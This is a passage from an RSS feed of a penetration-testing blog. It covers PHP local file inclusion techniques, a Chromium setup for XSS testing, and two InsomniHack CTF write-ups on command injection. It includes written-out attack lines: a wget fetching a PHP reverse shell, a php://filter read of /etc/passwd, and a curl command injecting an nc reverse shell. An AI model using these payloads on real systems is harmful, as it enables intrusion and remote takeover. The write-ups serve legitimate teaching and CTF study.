&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.183.128/fileincl/example1.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://input&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Post Data payload, try something simple to start with like: &lt;code&gt;&amp;lt;? system('uname -a');?&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then try and download a &lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;reverse shell&lt;/a&gt; from your attacking machine using:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;? system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After uploading execute the reverse shell at &lt;code&gt;http://192.168.183.129/shell.php&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;php-wrapper-phpfilter&quot;&gt;PHP Wrapper php://filter&lt;/h3&gt;

&lt;p&gt;Another PHP wrapper, &lt;code&gt;php://filter&lt;/code&gt; in this example the output is encoded using base64, so you’ll need to decode the output.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.155.131/fileincl/example1.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;php://filter/convert.base64-encode/resource&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../etc/passwd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;procselfenviron-lfi-method&quot;&gt;/proc/self/environ LFI Method&lt;/h3&gt;

&lt;p&gt;If it’s possible to include &lt;code&gt;/proc/self/environ&lt;/code&gt; from your vulnerable LFI script, then code execution can be leveraged by manipulating the &lt;code&gt;User Agent&lt;/code&gt; parameter with Burp. After the PHP code has been introduced &lt;code&gt;/proc/self/environ&lt;/code&gt; can be executed via your vulnerable LFI script.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;procselffd-lfi-method&quot;&gt;/proc/self/fd/ LFI Method&lt;/h3&gt;

&lt;p&gt;Similar to the previous &lt;code&gt;/proc/self/environ&lt;/code&gt; method, it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the &lt;code&gt;referer&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This method is a little tricky as the proc file that contains the Apache error log information changes under &lt;code&gt;/proc/self/fd/&lt;/code&gt; e.g. &lt;code&gt;/proc/self/fd/2&lt;/code&gt;, &lt;code&gt;/proc/self/fd/10&lt;/code&gt; etc. I’d recommend brute forcing the directory structure of the /proc/self/fd/ directory with Burp Intruder + FuzzDB’s &lt;a href=&quot;https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt&quot;&gt;LFI-FD-Check.txt&lt;/a&gt; list of likely proc files, you can then monitor the returned page sizes and investigate.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;fimap-lfi-pen-testing-tool&quot;&gt;fimap LFI Pen Testing Tool&lt;/h2&gt;

&lt;p&gt;fimap is a &lt;a href=&quot;/blog/penetration-testing-tools-cheat-sheet/&quot;&gt;tool used on pen tests&lt;/a&gt; that automates the above processes of discovering and exploiting LFI scripts. Upon discovering a vulnerable LFI script fimap will enumerate the local filesystem and search for writable log files or locations such as &lt;code&gt;/proc/self/environ&lt;/code&gt;. Another tool commonly used by pen testes to automate LFI discovery is Kali’s dotdotpwn, which works in a similar way.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;fimap--phpinfo-exploit&quot;&gt;fimap + phpinfo() Exploit&lt;/h3&gt;

&lt;p&gt;Fimap exploits PHP’s temporary file creation via Local File Inclusion by abusing PHPinfo() information disclosure glitch to reveal the location of the created temporary file.&lt;/p&gt;

&lt;p&gt;If a phpinfo() file is present, it’s usually possible to get a shell, if you don’t know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster.&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>HowTo: Kali Linux Chromium Install for Web App Pen Testing</title>
          <link>https://highon.coffee/blog/kali-chromium-install/</link>
          <pubDate>Thu, 24 Mar 2016 11:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Kali</category>
          
          <category>Web Application Penetration Testing</category>
          
          <category>Chromium</category>
          
          
          <category>kali linux</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/kali-chromium-install/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#why-use-chromium-for-web-application-testing-&quot; id=&quot;markdown-toc-why-use-chromium-for-web-application-testing-&quot;&gt;Why use Chromium for Web Application Testing ?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#kali-install-chromium-browser&quot; id=&quot;markdown-toc-kali-install-chromium-browser&quot;&gt;Kali Install Chromium Browser&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#chromium-wont-launch-on-kali&quot; id=&quot;markdown-toc-chromium-wont-launch-on-kali&quot;&gt;Chromium Won’t Launch on Kali&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#chromium-setup-for-web-application-testing&quot; id=&quot;markdown-toc-chromium-setup-for-web-application-testing&quot;&gt;Chromium Setup for Web Application Testing&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#complete-chromium-config&quot; id=&quot;markdown-toc-complete-chromium-config&quot;&gt;Complete Chromium Config&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#kali-chromium-error-you-are-using-an-unsupported-command-line-flag-disable-web-security-security-and-stability-will-suffer&quot; id=&quot;markdown-toc-kali-chromium-error-you-are-using-an-unsupported-command-line-flag-disable-web-security-security-and-stability-will-suffer&quot;&gt;Kali Chromium Error: You Are using an Unsupported Command line flag –disable-web-security. Security and Stability will suffer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;why-use-chromium-for-web-application-testing-&quot;&gt;Why use Chromium for Web Application Testing ?&lt;/h2&gt;

&lt;p&gt;The primary reason I use Chromium is for DOM based XSS testing which as far as I know cannot be disabled in Firefox. If you have never heard of Chromium it’s the opensource version of Google Chrome and doesn’t have flash player built in and various other codecs such as: AAC, H.264, and MP3 Support.&lt;/p&gt;

&lt;p&gt;It’s possible to disable all security features in Chromium or Chrome using the switch &lt;code&gt;--disable-web-security&lt;/code&gt;, this will disable all security options and allow you to test for DOM based XSS.&lt;/p&gt;

&lt;h2 id=&quot;kali-install-chromium-browser&quot;&gt;Kali Install Chromium Browser&lt;/h2&gt;

&lt;p&gt;Chromium exists within the Kali repositories and can be installed using:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;chromium&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;chromium-wont-launch-on-kali&quot;&gt;Chromium Won’t Launch on Kali&lt;/h2&gt;

&lt;p&gt;By default chromium won’t launch on Kali Linux, this is due to chromium running as the root user. You can fix this by opening &lt;code&gt;/etc/chromium.d/default-flags&lt;/code&gt; in vim and adding the following lines:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Run as root Kali&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; --password-store=detect --no-sandbox --user-data-dir&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This disables the &lt;code&gt;user-data-dir&lt;/code&gt; and &lt;code&gt;sandboxing&lt;/code&gt;, disabling sandboxing will have some obvious security issues but this browser is for web application penetration testing only.&lt;/p&gt;

&lt;h2 id=&quot;chromium-setup-for-web-application-testing&quot;&gt;Chromium Setup for Web Application Testing&lt;/h2&gt;

&lt;p&gt;In order to use chromium for Web Application Penetration Testing you need to disable all the security features, allowing for DOM based XSS testing in chromium.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Disable Chromium security features for web app testing&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; --disable-web-security&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;complete-chromium-config&quot;&gt;Complete Chromium Config&lt;/h2&gt;

&lt;p&gt;What my entire Chromium config looks like:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# A set of command line flags that we want to set by default.&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Do not hide any extensions in the about:extensions dialog&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; --show-component-extension-options&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Don't use the GPU blacklist (bug #802933)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; --ignore-gpu-blacklist&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Run as root Kali&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; --password-store=detect --no-sandbox --user-data-dir&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Disable Chromium security features for web app testing&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CHROMIUM_FLAGS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; --disable-web-security&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;kali-chromium-error-you-are-using-an-unsupported-command-line-flag-disable-web-security-security-and-stability-will-suffer&quot;&gt;Kali Chromium Error: You Are using an Unsupported Command line flag –disable-web-security. Security and Stability will suffer&lt;/h2&gt;

&lt;p&gt;Ignore the following error, Chromium still process DOM based XSS. The same error occurs in Google Chrome.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/kali-chromium/kali-chromium-web-app-testing.png&quot; alt=&quot;Kali Chromium Error: You Are using an Unsupported Command line flag --disable-web-security. Security and Stability will suffer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>InsomniHack CTF Teaser - Smartcat2 Writeup</title>
          <link>https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/</link>
          <pubDate>Mon, 18 Jan 2016 14:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>burp</category>
          
          <category>command injection</category>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#insomnihack-smartcat-2&quot; id=&quot;markdown-toc-insomnihack-smartcat-2&quot;&gt;InsomniHack Smartcat 2&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#procselfenviron-injection&quot; id=&quot;markdown-toc-procselfenviron-injection&quot;&gt;proc/self/environ Injection&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot; id=&quot;markdown-toc-reverse-shell&quot;&gt;Reverse Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h2&gt;

&lt;p&gt;Exploit the web based ping command tool and capture the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/insomnihack/smartcat2.png&quot; alt=&quot;smartcat2 CTF&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;insomnihack-smartcat-2&quot;&gt;InsomniHack Smartcat 2&lt;/h2&gt;

&lt;p&gt;Due to filtering it was impossible to enter any white space in commands, making it far more difficult than the smartcat1 challenge. Initially I tried and failed to use a &lt;code&gt;/dev/tcp/ip/port&lt;/code&gt; reverse shell.&lt;/p&gt;

&lt;h3 id=&quot;procselfenviron-injection&quot;&gt;proc/self/environ Injection&lt;/h3&gt;

&lt;p&gt;The environment variable &lt;code&gt;HTTP_USER_AGENT=&lt;/code&gt; which contains the contents of the &lt;code&gt;User-Agent:&lt;/code&gt; field, had no filtering allowing for easy injection of a reverse shell.&lt;/p&gt;

&lt;p&gt;Using command injection it was possible to execute &lt;code&gt;/proc/self/env&lt;/code&gt; and successfully execute a reverse shell.&lt;/p&gt;

&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h3&gt;

&lt;p&gt;Putting it all together using curl:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl &lt;span class=&quot;s1&quot;&gt;'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--user-agent&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;';rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc XXX.XXX.XXX.XXX 80 &amp;gt;/tmp/f;exit'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'dest=%0ash&amp;lt;/proc/self/environ'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The flag was not readable by &lt;code&gt;www-data&lt;/code&gt;, the binary &lt;code&gt;readflag&lt;/code&gt; was required to read the contents of the flag.&lt;/p&gt;

&lt;p&gt;A couple of lines needed typing in to “confirm” you had an interactive shell, after entering the flag was displayed:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@smartcat:/home/smartcat&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./readflag
./readflag
Give me a...
Give me a...
... flag!
... flag!
Flag:
            ___
        .-&lt;span class=&quot;s2&quot;&gt;&quot;; ! ;&quot;&lt;/span&gt;-.
      .&lt;span class=&quot;s1&quot;&gt;'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ \ \!&lt;/span&gt;:|:!/ / / .&lt;span class=&quot;s1&quot;&gt;')
   \ `.`.\ |!|! |/,'&lt;/span&gt;.&lt;span class=&quot;s1&quot;&gt;' /
    `._`.\\\!!!// .'&lt;/span&gt;_.&lt;span class=&quot;s1&quot;&gt;'
       `.`.\\|//.'&lt;/span&gt;.&lt;span class=&quot;s1&quot;&gt;'
        |`._`n'&lt;/span&gt;_.&lt;span class=&quot;s1&quot;&gt;'|  hjw
        &quot;----^----&quot;

INS{shells_are _way_better_than_cats}

www-data@smartcat:/home/smartcat$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the challenge :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>InsomniHack CTF Teaser - Smartcat1 Writeup</title>
          <link>https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/</link>
          <pubDate>Mon, 18 Jan 2016 14:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>burp</category>
          
          <category>command injection</category>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#insomnihack-smartcat1&quot; id=&quot;markdown-toc-insomnihack-smartcat1&quot;&gt;InsomniHack Smartcat1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#flag&quot; id=&quot;markdown-toc-flag&quot;&gt;Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h2&gt;

&lt;p&gt;Exploit the web based ping command tool and capture the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/insomnihack/smartcat1.png&quot; alt=&quot;smartcat1 CTF&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;insomnihack-smartcat1&quot;&gt;InsomniHack Smartcat1&lt;/h2&gt;

&lt;p&gt;Entering nothing or a &lt;code&gt;'&lt;/code&gt; renders the error: &lt;code&gt;Error running ping -c 1 foo&lt;/code&gt;. Enumeration indicated the following characters were filtered &lt;code&gt;$;&amp;amp;|({`\t&lt;/code&gt; Note, that included whitespace filtering.&lt;/p&gt;

&lt;p&gt;I loaded up burp and went through the ASCII table for other ways of escaping the command. It was possible to use LF &lt;code&gt;%0a&lt;/code&gt; to escape the existing command and enter another such as: &lt;code&gt;dest=8.8.8.8%0als&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Viewing the source code of &lt;code&gt;index.cgi&lt;/code&gt; confirmed the character filtering.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cgi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mod_cassette_is_back/0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;format-me-i-im-famous&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dirbuster.will.not.help.you&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;solve_me_already&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-Powered-By: %s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-type: text/html&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
&amp;amp;lt;html&amp;amp;gt;

&amp;amp;lt;head&amp;amp;gt;&amp;amp;lt;title&amp;amp;gt;Can I haz Smart Cat ???&amp;amp;lt;/title&amp;amp;gt;&amp;amp;lt;/head&amp;amp;gt;

&amp;amp;lt;body&amp;amp;gt;

  &amp;amp;lt;h3&amp;amp;gt; Smart Cat debugging interface &amp;amp;lt;/h3&amp;amp;gt;
&quot;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;blacklist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; $;&amp;amp;amp;|({`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cgi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FieldStorage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getvalue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dest&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;badchar&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blacklist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;badchar&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Bad character %s in dest&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;badchar&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%n&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Segmentation fault&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
